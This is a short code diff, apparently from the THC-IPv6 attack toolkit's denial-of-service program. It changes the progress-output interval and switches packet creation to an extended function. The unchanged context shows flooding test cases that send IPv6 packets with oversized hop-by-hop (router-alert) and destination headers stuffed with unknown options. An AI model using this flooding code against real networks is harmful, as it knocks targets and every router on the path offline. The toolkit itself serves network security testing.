@@ -102,7 +102,7 @@ int main(int argc, char *argv[]) {
   }
 
   printf("Performing denial of service test case no. %d attack on %s via %s:\n", test, argv[2], argv[1]);
-  printf("A \".\" is shown for every 100 packets sent, press Control-C to end...\n");
+  printf("A \".\" is shown for every 1000 packets sent, press Control-C to end...\n");
 
   /********************** TEST CASES ************************/
 
@@ -110,7 +110,7 @@ int main(int argc, char *argv[]) {
     printf("Test %d: large hop-by-hop header with router-alert and filled with unknown options.\n", count);
     printf("WARNING: this attack affects all routers on the network path to the target!!\n");
     sleep(3);
-    if ((pkt = thc_create_ipv6(interface, PREFER_GLOBAL, &pkt_len, src6, dst6, 255, 0, 0, 0, 0)) == NULL)
+    if ((pkt = thc_create_ipv6_extended(interface, PREFER_GLOBAL, &pkt_len, src6, dst6, 255, 0, 0, 0, 0)) == NULL)
       return -1;
     buf[0] = 5;
     buf[1] = 2;
@@ -151,7 +151,7 @@ int main(int argc, char *argv[]) {
 
   if (test == count) {          // 1432
     printf("Test %d: large destination header filled with unknown options.\n", count);
-    if ((pkt = thc_create_ipv6(interface, PREFER_GLOBAL, &pkt_len, src6, dst6, 255, 0, 0, 0, 0)) == NULL)
+    if ((pkt = thc_create_ipv6_extended(interface, PREFER_GLOBAL, &pkt_len, src6, dst6, 255, 0, 0, 0, 0)) == NULL)
       return -1;
     for (i = 1; i < 237; i++) {
       buf[6 + i * 6] = (i % 63) + 1;
@@ -178,7 +178,7 @@ int main(int argc, char *argv[]) {
     thc_send_pkt(interface, pkt, &pkt_len);
     usleep(1);
     count++;
-    if (count % 100 == 0)
+    if (count % 1000 == 0)
       printf(".");
   }
 
